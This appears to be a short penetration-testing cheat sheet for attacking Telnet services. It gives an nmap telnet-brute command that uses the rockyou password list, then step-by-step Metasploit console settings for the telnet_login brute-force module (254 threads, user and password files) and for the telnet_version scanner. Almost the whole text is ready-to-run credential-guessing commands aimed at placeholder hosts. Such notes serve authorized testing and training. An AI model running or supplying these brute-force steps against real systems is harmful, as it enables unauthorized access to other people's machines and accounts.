# **Telnet**

## nmap -p 23 --script telnet-brute --script-args userdb=/usr/share/metasploit-framework/data/wordlists/unix_users,passdb=/usr/share/wordlists/rockyou.txt,telnet-brute.timeout=20s

<target ip>  
  

## == metasploit ==  
1. telnet bruteforce  
  
use auxiliary/scanner/telnet/telnet_login  
msf auxiliary(telnet_login) > set BLANK_PASSWORDS false  
BLANK_PASSWORDS => false  
msf auxiliary(telnet_login) > set PASS_FILE passwords.txt  
PASS_FILE => passwords.txt  
msf auxiliary(telnet_login) > set RHOSTS x.x.x.x  
RHOSTS => x.x.x.x  
msf auxiliary(telnet_login) > set THREADS 254  
THREADS => 254  
msf auxiliary(telnet_login) > set USER_FILE users.txt  
USER_FILE => users.txt  
msf auxiliary(telnet_login) > set VERBOSE false  
VERBOSE => false  
msf auxiliary(telnet_login) > run  
  
msf auxiliary(telnet_login) > sessions -l // to see the sessions that succeded  
  
2. telnet version  
use auxiliary/scanner/telnet/telnet_version  
msf auxiliary(telnet_version) > set RHOSTS x.x.x.x  
RHOSTS => x.x.x.x  
msf auxiliary(telnet_version) > set THREADS 254  
THREADS => 254  
msf auxiliary(telnet_version) > run